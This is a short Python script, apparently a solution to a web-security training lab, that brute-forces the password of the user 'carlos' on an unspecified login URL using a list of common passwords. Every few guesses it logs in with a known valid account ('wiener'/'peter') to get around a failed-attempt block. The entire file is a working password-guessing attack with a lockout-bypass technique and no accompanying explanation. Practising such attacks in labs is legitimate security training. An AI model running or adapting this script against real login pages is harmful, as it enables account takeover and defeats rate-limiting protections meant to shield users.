import requests

# I found that this works to halt execution after finding valid
class Found(Exception):
    pass

session = requests.Session()

def login(session, username, password):
    url = '' # login site

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Connection': 'keep-alive'
    }

    data = {'username': username, 'password': password}

    try:
        with session.post(url, headers=headers, data=data, allow_redirects=False) as response:
            if response.status_code == 302:
                print('[FOUND!] - Username: {} | Password: {} | Status: {}'.format(username, password, response.status_code))
                raise Found()
            elif response.status_code != 200:
                print('[ERROR?] - Username: {} | Password: {} | Status: {}'.format(username, password, response.status_code))
    finally:
        pass

def main(maxTries):
    passwords = ['123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234', '111111', '1234567', 'dragon', '123123', 'baseball', 'abc123', 'football', 'monkey', 'letmein', 'shadow', 'master', '666666', 'qwertyuiop', '123321', 'mustang', '1234567890', 'michael', '654321', 'superman', '1qaz2wsx', '7777777', '121212', '000000', 'qazwsx', '123qwe', 'killer', 'trustno1', 'jordan', 'jennifer', 'zxcvbnm', 'asdfgh', 'hunter', 'buster', 'soccer', 'harley', 'batman', 'andrew', 'tigger', 'sunshine', 'iloveyou', '2000', 'charlie', 'robert', 'thomas', 'hockey', 'ranger', 'daniel', 'starwars', 'klaster', '112233', 'george', 'computer', 'michelle', 'jessica', 'pepper', '1111', 'zxcvbn', '555555', '11111111', '131313', 'freedom', '777777', 'pass', 'maggie', '159753', 'aaaaaa', 'ginger', 'princess', 'joshua', 'cheese', 'amanda', 'summer', 'love', 'ashley', 'nicole', 'chelsea', 'biteme', 'matthew', 'access', 'yankees', '987654321', 'dallas', 'austin', 'thunder', 'taylor', 'matrix', 'mobilemail', 'mom', 'monitor', 'monitoring', 'montana', 'moon', 'moscow']

    for i, password in enumerate(passwords):
        login(session, 'carlos', password)

        if (i + 1) % (maxTries - 1) == 0: # every third element is temporarily skipped and logged in with valid details
            login(session, 'wiener', 'peter')

main(3)